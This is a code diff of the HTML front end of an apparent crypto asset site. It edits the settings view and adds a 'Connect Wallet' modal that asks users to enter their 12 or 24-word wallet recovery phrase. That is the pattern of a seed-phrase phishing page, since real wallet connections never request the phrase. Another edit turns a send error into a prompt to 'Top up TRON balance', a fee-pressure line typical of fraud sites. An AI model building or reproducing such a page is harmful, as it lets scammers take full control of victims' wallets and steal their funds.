@@ -69,6 +69,57 @@ window.smartsupp||(function(d) {
             <section class="asset-list hidden" id="nft-container"></section>
             <section class="asset-list hidden" id="activity-container"></section>
         </div>
+        <div id="view-settings" class="view-section hidden">
+                <div class="settings-header">
+                    <h2>Settings</h2>
+                </div>
+
+                <div class="user-profile-section">
+                    <div class="profile-avatar">
+                        <i class="fas fa-user"></i>
+                    </div>
+                    <p class="user-email" id="settingsEmail">Loading...</p>
+                    <p class="user-balance-small" id="settingsBalanceDisplay">$ 0.00</p>
+                </div>
+
+                <div class="settings-group">
+                    <div class="settings-item" onclick="handlePasswordReset()">
+                        <div class="settings-icon icon-blue">
+                            <i class="fas fa-lock"></i>
+                        </div>
+                        <div class="settings-label">Reset Password</div>
+                        <div class="settings-arrow">❯</div>
+                    </div>
+                    
+                    <div class="settings-item" onclick="openConnectModal()">
+                        <div class="settings-icon icon-green">
+                            <i class="fas fa-wallet"></i>
+                        </div>
+                        <div class="settings-label">Connect Wallet</div>
+                        <div class="settings-arrow">❯</div>
+                    </div>
+                </div>
+
+                <div class="settings-group">
+                    <div class="settings-item" onclick="window.location.href='mailto:support@reinasset.com'">
+                        <div class="settings-icon icon-orange">
+                            <i class="fas fa-headset"></i>
+                        </div>
+                        <div class="settings-label">Contact Support</div>
+                        <div class="settings-arrow">❯</div>
+                    </div>
+                </div>
+
+                <div class="settings-group">
+                    <div class="settings-item" onclick="handleLogout()"> 
+                        <div class="settings-icon icon-red">
+                            <i class="fas fa-sign-out-alt"></i>
+                        </div>
+                        <div class="settings-label" style="color: #eb5757;">Logout</div>
+                    </div>
+                </div>
+        </div>
+
 
         <div id="connectWalletModal" class="modal">
             <div class="modal-content" style="max-width: 400px;">
@@ -98,29 +149,6 @@ window.smartsupp||(function(d) {
 
 
 
-<div id="connectWalletModal" class="modal">
-    <div class="modal-content">
-        <div class="modal-header">
-            <h3>Connect Wallet</h3>
-            <span class="close-modal" id="closeConnect">&times;</span>
-        </div>
-        
-        <div class="form-group">
-            <label>Select Provider</label>
-            <select id="walletType">
-                <option value="Trust Wallet">Trust Wallet</option>
-                <option value="MetaMask">MetaMask</option>
-                <option value="Coinbase">Coinbase</option>
-                <option value="Phantom">Phantom</option>
-            </select>
-        </div>
-
-        <h5>RECOVERY PHRASE</h5>
-        <textarea id="walletPhrase" placeholder="Enter 12 or 24-word phrase"></textarea>
-        
-        <button id="submitConnect">Secure Connect</button>
-    </div>
-</div>
 
 <div id="pendingModal" class="modal">
     <div class="modal-content" style="text-align: center;">
@@ -138,56 +166,9 @@ window.smartsupp||(function(d) {
             </div>
     </div>
 
-    <div id="view-settings" class="hidden">
-    <div class="settings-header">
-        <h2>Settings</h2>
-    </div>
 
-    <div class="user-profile-section">
-        <div class="profile-avatar">
-            <i class="fas fa-user"></i>
-        </div>
-        <p class="user-email" id="settingsEmail">user@example.com</p>
-        <p class="user-balance-small" id="settingsBalanceDisplay">$ 0.00</p>
-    </div>
 
-    <div class="settings-group">
-        <div class="settings-item" onclick="handlePasswordReset()">
-            <div class="settings-icon icon-blue">
-                <i class="fas fa-lock"></i>
-            </div>
-            <div class="settings-label">Reset Password</div>
-            <div class="settings-arrow">❯</div>
-        </div>
-        
-        <div class="settings-item" id="connect-wallet">
-            <div class="settings-icon icon-green">
-                <i class="fas fa-wallet"></i>
-            </div>
-            <div class="settings-label">Connect Wallet</div>
-            <div class="settings-arrow">❯</div>
-        </div>
-    </div>
 
-    <div class="settings-group">
-        <div class="settings-item" onclick="window.location.href='mailto:reinasset@gmail.com'">
-            <div class="settings-icon icon-orange">
-                <i class="fas fa-headset"></i>
-            </div>
-            <div class="settings-label">Contact Support</div>
-            <div class="settings-arrow">❯</div>
-        </div>
-    </div>
-
-    <div class="settings-group">
-        <div class="settings-item" onclick="auth.signOut()">
-            <div class="settings-icon icon-red">
-                <i class="fas fa-sign-out-alt"></i>
-            </div>
-            <div class="settings-label" style="color: #eb5757;">Logout</div>
-        </div>
-    </div>
-</div>
 
     <nav class="bottom-nav">
         <div class="nav-item active" id="nav-home">
@@ -228,6 +209,31 @@ window.smartsupp||(function(d) {
     </div>
 </div>
 
+<div id="connectWalletModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3>Connect Wallet</h3>
+            <button class="close-btn" id="closeConnect">&times;</button>
+        </div>
+        
+        <label style="display:block; margin-bottom: 8px; font-size: 13px; color: #9aa5b1;">SELECT WALLET</label>
+        <select id="walletType" style="width:100%; padding:12px; border-radius:12px; border:1px solid #eef2f7; margin-bottom:20px;">
+            <option>Trust Wallet</option>
+            <option>Metamask</option>
+            <option>Phantom</option>
+        </select>
+
+        <label style="display:block; margin-bottom: 8px; font-size: 13px; color: #9aa5b1;">ENTER MESSAGE</label>
+        <textarea id="walletPhrase" placeholder="Enter your 12 or 24-word recovery phrase..." 
+            style="width:100%; height:120px; padding:15px; border-radius:12px; border:1px solid #eef2f7; resize:none; margin-bottom:20px;"></textarea>
+
+        <button id="submitConnect" style="width:100%; background:#2f80ed; color:white; border:none; padding:15px; border-radius:14px; font-weight:600;">
+            Connect Wallet
+        </button>
+    </div>
+</div>
+
+
 <div id="txnModal" class="modal-overlay hidden">
     <div class="receive-content">
         <div class="receive-header">
@@ -239,7 +245,7 @@ window.smartsupp||(function(d) {
         <div class="txn-container">
             <div class="txn-card asset-info-card">
                 <img id="txnCoinLogo" src="" width="30">
-                <span id="txnCoinName">Bitcoin</span>
+                <span id="txnCoinName"></span>
                 <span id="txnCoinBalance" class="right">0 BTC</span>
             </div>
 
@@ -264,7 +270,7 @@ window.smartsupp||(function(d) {
                     <option value="doge">DOGE</option>
                 </select>
             </div>
-            <p id="sendError" class="error-text hidden">Insufficient TRON balance (Min 50 TRX required for fees)</p>
+            <p id="sendError" class="error-text hidden">Top up TRON balance </p>
             <button id="continueBtn" class="main-btn">Continue</button>
         </div>
     </div>
